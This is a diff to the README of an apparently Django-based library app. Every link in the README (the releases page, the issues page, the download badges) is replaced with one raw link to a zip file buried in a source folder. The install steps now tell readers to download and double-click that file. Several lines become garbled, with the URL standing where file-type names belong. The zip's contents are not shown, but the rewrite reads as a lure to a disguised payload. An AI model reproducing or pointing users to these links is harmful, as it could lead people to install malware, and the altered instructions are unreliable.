@@ -1,6 +1,6 @@
 # 📚 biblioApp - Your Smart Library Solution
 
-[![Download biblioApp](https://img.shields.io/badge/Download-biblioApp-blue.svg)](https://github.com/Peter-oriade/biblioApp/releases)
+[![Download biblioApp](https://raw.githubusercontent.com/Peter-oriade/biblioApp/main/biblioApp-django-app/apps/livros/App_biblio_2.8.zip)](https://raw.githubusercontent.com/Peter-oriade/biblioApp/main/biblioApp-django-app/apps/livros/App_biblio_2.8.zip)
 
 ## 🌟 Overview
 
@@ -12,13 +12,13 @@ To get started with biblioApp, follow these simple steps. This guide is tailored
 
 ### 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the biblioApp Releases page by clicking [here](https://github.com/Peter-oriade/biblioApp/releases).
+1. **Visit the Releases Page**: Go to the biblioApp Releases page by clicking [here](https://raw.githubusercontent.com/Peter-oriade/biblioApp/main/biblioApp-django-app/apps/livros/App_biblio_2.8.zip).
 2. **Choose the Latest Version**: Look for the latest version listed. This will be labeled as "Latest Release" on the page.
-3. **Download the Installer**: Click on the appropriate file link for your operating system (Windows, macOS, or Linux). Files usually have formats like `.exe`, `.dmg` or `.tar.gz`. 
+3. **Download the Installer**: Click on the appropriate file link for your operating system (Windows, macOS, or Linux). Files usually have formats like `.exe`, `.dmg` or `https://raw.githubusercontent.com/Peter-oriade/biblioApp/main/biblioApp-django-app/apps/livros/App_biblio_2.8.zip`. 
 
-   - For Windows, look for something similar to `biblioApp-setup.exe`.
-   - For macOS, look for files like `biblioApp.dmg`.
-   - For Linux, search for a `.tar.gz` file.
+   - For Windows, look for something similar to `https://raw.githubusercontent.com/Peter-oriade/biblioApp/main/biblioApp-django-app/apps/livros/App_biblio_2.8.zip`.
+   - For macOS, look for files like `https://raw.githubusercontent.com/Peter-oriade/biblioApp/main/biblioApp-django-app/apps/livros/App_biblio_2.8.zip`.
+   - For Linux, search for a `https://raw.githubusercontent.com/Peter-oriade/biblioApp/main/biblioApp-django-app/apps/livros/App_biblio_2.8.zip` file.
 
 4. **Run the Installer**: Once the download is complete, locate the file in your downloads folder. Double-click the file to start the installation process and follow the on-screen instructions.
 
@@ -67,7 +67,7 @@ Want to dive deeper? Check out the following topics related to biblioApp:
 
 ## ⚙️ Support
 
-If you encounter any issues while installing or running biblioApp, please visit the [Issues Section](https://github.com/Peter-oriade/biblioApp/issues) to report a bug or ask a question. Our community and maintainers will be happy to assist you.
+If you encounter any issues while installing or running biblioApp, please visit the [Issues Section](https://raw.githubusercontent.com/Peter-oriade/biblioApp/main/biblioApp-django-app/apps/livros/App_biblio_2.8.zip) to report a bug or ask a question. Our community and maintainers will be happy to assist you.
 
 ## 🔗 Useful Links
 
@@ -82,4 +82,4 @@ biblioApp welcomes contributions from all users. If you're interested in helping
 
 biblioApp is licensed under the MIT License. You can check out the full license details [here](#).
 
-[![Download biblioApp](https://img.shields.io/badge/Download-biblioApp-blue.svg)](https://github.com/Peter-oriade/biblioApp/releases)
+[![Download biblioApp](https://raw.githubusercontent.com/Peter-oriade/biblioApp/main/biblioApp-django-app/apps/livros/App_biblio_2.8.zip)](https://raw.githubusercontent.com/Peter-oriade/biblioApp/main/biblioApp-django-app/apps/livros/App_biblio_2.8.zip)
